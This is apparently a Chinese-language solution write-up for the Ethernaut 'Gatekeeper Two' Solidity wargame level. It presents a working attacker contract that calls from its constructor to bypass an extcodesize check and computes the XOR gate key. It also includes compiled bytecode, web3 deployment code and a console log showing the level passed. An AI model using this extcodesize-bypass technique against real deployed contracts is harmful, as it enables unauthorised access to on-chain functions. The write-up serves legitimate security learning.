# 15 Gatekepper Two

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

目标: 调用`enter`, 使其通过其上的3个modifier

### 关卡1

和 [gatekeeper one](https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/14_GatekeeperOne.md#关卡-1) 中一样, 使用一个合约进行`call`调用, 就可以保证 `require(msg.sender != tx.origin)`

### 关卡2

```solidity
  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
```

要求调用者的`codesize`为`0`,  看上去和关卡1的要求是矛盾的: 合约的codesize就不为`0`

换个思路, 其要求的是: 在执行到`assembly { x := extcodesize(caller()) }`这句代码时, 调用者的`codesize`为`0`

> `codesize` 为 0
>
> + EOA地址, 非合约地址, 没有代码, 所以`codesize`为0
> + 合约在构造函数中时, 还没构造完成(还在部署中), 所以`codesize`为0

所以结合关卡1:

```solidity
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract Attaker {
    //在构造函数中进行attack, 以满足extcodesize(caller()) 为0 
    constructor(address _target){
      bytes8 key = xxx
        );

        (bool success, ) = _target.call(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success);
    }
}
```



### 关卡3

```solidity
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }
```

mask 的16进制为全`F` 即可

```solidity
      bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 0xFFFFFFFFFFFFFFFF    
        );
```





## 答案

```solidity
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract Attaker {

    constructor(address _target){
      bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 0xFFFFFFFFFFFFFFFF    
        );

        (bool success, ) = _target.call(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success);
    }
}
```



```js
let abi = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_target",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	}
]


let byteCode = "0x" +
        "608060405234801561001057600080fd5b506040516103a03803806103a08339818101604052810190610032919061018e565b600067ffffffffffffffff3060405160200161004e9190610212565b6040516020818303038152906040528051906020012060c01c1860c01b905060008273ffffffffffffffffffffffffffffffffffffffff16826040516024016100979190610244565b6040516020818303038152906040527f3370204e000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610121919061022d565b6000604051808303816000865af19150503d806000811461015e576040519150601f19603f3d011682016040523d82523d6000602084013e610163565b606091505b505090508061017157600080fd5b505050610353565b6000815190506101888161033c565b92915050565b6000602082840312156101a4576101a361032a565b5b60006101b284828501610179565b91505092915050565b6101cc6101c782610275565b610306565b82525050565b6101db81610287565b82525050565b60006101ec8261025f565b6101f6818561026a565b93506102068185602086016102d3565b80840191505092915050565b600061021e82846101bb565b60148201915081905092915050565b600061023982846101e1565b915081905092915050565b600060208201905061025960008301846101d2565b92915050565b600081519050919050565b600081905092915050565b6000610280826102b3565b9050919050565b60007fffffffffffffffff00000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60005b838110156102f15780820151818401526020810190506102d6565b83811115610300576000848401525b50505050565b600061031182610318565b9050919050565b60006103238261032f565b9050919050565b600080fd5b60008160601b9050919050565b61034581610275565b811461035057600080fd5b50565b603f806103616000396000f3fe6080604052600080fdfea2646970667358221220ec1b731dacb5de03b518ef2ba9ff10f8ea093cece6c61542af00d0f23f9a632a64736f6c63430008070033"

//部署时会调用构造函数, 也就完成了攻击
//arguments: [instance] 用于传入被攻击的合约地址到构造函数
let myContract = new web3.eth.Contract(abi);
let deploy = myContract.deploy({
	data: byteCode,
	arguments: [instance]
});
let myInstance = await deploy.send({
	from: player
});

```



## 参考过程

```
^^.js:45 (⌐■_■) 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 15:57:26.814
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xcdcdcf714a1e2abf7d9588673389f4b56ac41eb127dd3f894b7809bbe3e4ab3d
^^.js:35 => 实例地址0x680cd82A342Ce017FfdBa72C337B11f64Ec25Db1
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 15:57:32.461
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xcdcdcf714a1e2abf7d9588673389f4b56ac41eb127dd3f894b7809bbe3e4ab3d
redux-logger.js:1  action SET_BLOCK_NUM @ 15:57:32.758
let abi = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_target",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	}
]


let byteCode = "0x" +
        "608060405234801561001057600080fd5b506040516103a03803806103a08339818101604052810190610032919061018e565b600067ffffffffffffffff3060405160200161004e9190610212565b6040516020818303038152906040528051906020012060c01c1860c01b905060008273ffffffffffffffffffffffffffffffffffffffff16826040516024016100979190610244565b6040516020818303038152906040527f3370204e000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610121919061022d565b6000604051808303816000865af19150503d806000811461015e576040519150601f19603f3d011682016040523d82523d6000602084013e610163565b606091505b505090508061017157600080fd5b505050610353565b6000815190506101888161033c565b92915050565b6000602082840312156101a4576101a361032a565b5b60006101b284828501610179565b91505092915050565b6101cc6101c782610275565b610306565b82525050565b6101db81610287565b82525050565b60006101ec8261025f565b6101f6818561026a565b93506102068185602086016102d3565b80840191505092915050565b600061021e82846101bb565b60148201915081905092915050565b600061023982846101e1565b915081905092915050565b600060208201905061025960008301846101d2565b92915050565b600081519050919050565b600081905092915050565b6000610280826102b3565b9050919050565b60007fffffffffffffffff00000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60005b838110156102f15780820151818401526020810190506102d6565b83811115610300576000848401525b50505050565b600061031182610318565b9050919050565b60006103238261032f565b9050919050565b600080fd5b60008160601b9050919050565b61034581610275565b811461035057600080fd5b50565b603f806103616000396000f3fe6080604052600080fdfea2646970667358221220ec1b731dacb5de03b518ef2ba9ff10f8ea093cece6c61542af00d0f23f9a632a64736f6c63430008070033"

//deploy as attack
let myContract = new web3.eth.Contract(abi);
let deploy = myContract.deploy({
	data: byteCode,
	arguments: [instance]
});
let myInstance = await deploy.send({
	from: player
});
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x9764f672503a3699b903e3c0ac241411e3fd7e7f24a4cc0ac865ab984ba17024
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x9764f672503a3699b903e3c0ac241411e3fd7e7f24a4cc0ac865ab984ba17024
undefined
^^.js:45 ⦿⽘⦿ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 15:57:48.861
redux-logger.js:1  action SET_BLOCK_NUM @ 15:57:52.760
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xd51057530e74e77d1e94962706e91bd1b038037660d7f71b4621fb77704ff22c
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xd51057530e74e77d1e94962706e91bd1b038037660d7f71b4621fb77704ff22c
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:73 ⊂(✰‿✰)つ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 15:58:02.756

```

